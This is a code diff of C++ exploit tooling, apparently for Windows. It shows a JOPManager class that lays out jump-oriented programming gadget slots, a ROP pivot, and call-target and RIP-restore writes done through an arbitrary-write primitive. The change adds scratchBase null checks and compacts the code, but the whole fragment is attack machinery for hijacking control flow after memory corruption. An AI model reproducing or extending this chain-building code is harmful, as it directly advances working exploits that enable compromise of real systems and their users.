@@ -73,47 +73,33 @@ void JOPManager::Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
     AddSlot("g3_cont [newRax+0x1C0]", SCRATCH_G3_CONT, g4);
 
     // gadget4 continuation: [newRax+0x28] -> rop pivot
-    // caller fills this in after Build() if they have a specific pivot address
     AddSlot("g4_cont [newRax+0x28]", SCRATCH_G4_CONT, 0);
 
-    DbgLog("[JOP] Build complete — %zu slots, scratch base=0x%llX\n",
+    DbgLog("[JOP] Build complete - %zu slots, scratch base=0x%llX\n",
         slots.size(), scratchBase);
 }
 
 void JOPManager::SetCallTarget(UINT64 addr) {
-    if (!writeFn) {
-        DbgLog("[JOP::SetCallTarget] FAIL: no write primitive\n");
-        return;
-    }
+    if (!scratchBase) { DbgLog("[JOP::SetCallTarget] FAIL: scratchBase not set\n"); return; }
+    if (!writeFn)     { DbgLog("[JOP::SetCallTarget] FAIL: no write primitive\n"); return; }
     UINT64 slot = scratchBase + SCRATCH_RAX;
     DbgLog("[JOP::SetCallTarget] [rax-0x35C17]=0x%llX -> 0x%llX\n", slot, addr);
     writeFn(slot, addr);
-
-    for (auto& s : slots) {
-        if (s.addr == slot) { s.value = addr; return; }
-    }
+    for (auto& s : slots) { if (s.addr == slot) { s.value = addr; return; } }
 }
 
 void JOPManager::SetRestoreRip(UINT64 addr) {
-    if (!writeFn) {
-        DbgLog("[JOP::SetRestoreRip] FAIL: no write primitive\n");
-        return;
-    }
+    if (!scratchBase) { DbgLog("[JOP::SetRestoreRip] FAIL: scratchBase not set\n"); return; }
+    if (!writeFn)     { DbgLog("[JOP::SetRestoreRip] FAIL: no write primitive\n"); return; }
     UINT64 slot = scratchBase + SCRATCH_G4_CONT;
     DbgLog("[JOP::SetRestoreRip] [newRax+0x28]=0x%llX -> 0x%llX\n", slot, addr);
     writeFn(slot, addr);
-
-    // Keep the slot list in sync
-    for (auto& s : slots) {
-        if (s.addr == slot) { s.value = addr; return; }
-    }
+    for (auto& s : slots) { if (s.addr == slot) { s.value = addr; return; } }
 }
 
 void JOPManager::Commit() {
-    if (!writeFn) {
-        DbgLog("[JOP::Commit] FAIL: no write primitive\n");
-        return;
-    }
+    if (!scratchBase) { DbgLog("[JOP::Commit] FAIL: scratchBase not set\n"); return; }
+    if (!writeFn)     { DbgLog("[JOP::Commit] FAIL: no write primitive\n"); return; }
     for (const auto& s : slots) {
         DbgLog("[JOP::Commit] %-35s  addr=0x%llX  val=0x%llX\n",
             s.name, s.addr, s.value);
